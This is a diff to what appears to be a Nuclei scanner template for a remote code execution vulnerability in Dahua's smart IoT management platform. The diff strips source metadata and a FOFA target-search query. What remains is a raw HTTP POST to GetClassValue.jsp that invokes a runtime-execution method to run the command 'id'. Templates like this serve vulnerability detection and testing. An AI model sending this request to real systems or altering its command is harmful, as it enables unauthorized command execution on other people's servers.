@@ -3,12 +3,8 @@ info:
   name: 大华智能物联综合管理平台GetClassValue远程代码执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/utky1pmt6cv0ypuo'
+  description: ''
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: utky1pmt6cv0ypuo
-    fofa: app="dahua-智能物联综合管理平台"
 http:
 - raw:
   - "POST /evo-apigw/admin/API/Developer/GetClassValue.jsp HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\nContent-Length: 121\n\n{\n    \"data\": {\n        \"clazzName\": \"com.dahua.admin.util.RuntimeUtil\",\n        \"methodName\": \"syncexecReturnInputStream\",\n        \"fieldName\": [\"id\"]\n    }\n}"
